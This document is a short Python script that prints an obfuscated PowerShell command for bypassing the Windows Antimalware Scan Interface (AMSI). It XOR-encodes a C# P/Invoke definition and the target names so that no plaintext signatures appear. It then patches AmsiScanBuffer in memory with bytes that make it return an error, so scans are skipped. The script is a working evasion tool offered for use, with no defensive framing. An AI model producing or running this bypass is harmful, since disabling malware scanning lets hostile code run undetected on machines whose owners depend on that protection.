#!/usr/bin/env python3
import secrets

k = secrets.randbelow(200) + 10

def enc(s):
    return ','.join(str(ord(c) ^ k) for c in s)

def enc_bytes(b):
    return ','.join(str(x ^ k) for x in b)

# entire C# definition XOR'd - no plaintext P/Invoke signatures in the script
cs = ('using System;using System.Runtime.InteropServices;'
      'public class A{'
      '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);'
      '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);'
      '[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,int n,out int w);}')

# mov eax, 0x80070057 ; ret  →  AmsiScanBuffer returns E_INVALIDARG, caller skips scan
patch = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]

print(f"$k=0x{k:02X}")
print(f"Add-Type -TypeDefinition (-join(@({enc(cs)})|%{{[char]($_-bxor$k)}}))")
print(f"$h=[A]::LoadLibrary((-join(@({enc('amsi.dll')})|%{{[char]($_-bxor$k)}})))")
print(f"$a=[A]::GetProcAddress($h,(-join(@({enc('AmsiScanBuffer')})|%{{[char]($_-bxor$k)}})))")
print(f"$p=[byte[]](@({enc_bytes(patch)})|%{{$_-bxor$k}})")
print(f"$w=0;[A]::WriteProcessMemory(-1,$a,$p,6,[ref]$w)")
